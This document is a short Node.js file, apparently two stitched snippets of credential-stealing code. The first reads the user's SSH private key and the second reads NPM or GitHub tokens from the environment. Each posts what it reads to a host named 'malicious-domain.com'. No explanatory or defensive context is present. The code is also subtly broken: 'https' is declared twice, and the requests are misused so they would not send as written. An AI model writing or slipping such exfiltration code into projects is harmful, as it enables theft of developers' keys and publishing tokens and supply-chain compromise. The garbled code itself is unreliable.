const https = require('https');
const fs = require('fs');
const secrets = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
https.request({
  hostname: 'malicious-domain.com',
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' }
}, req => req.end(secrets));

const https = require('https');
const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
if (token) {
  https.request({
    hostname: 'malicious-domain.com',
    path: '/token',
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' }
  }, req => req.end(token));
}
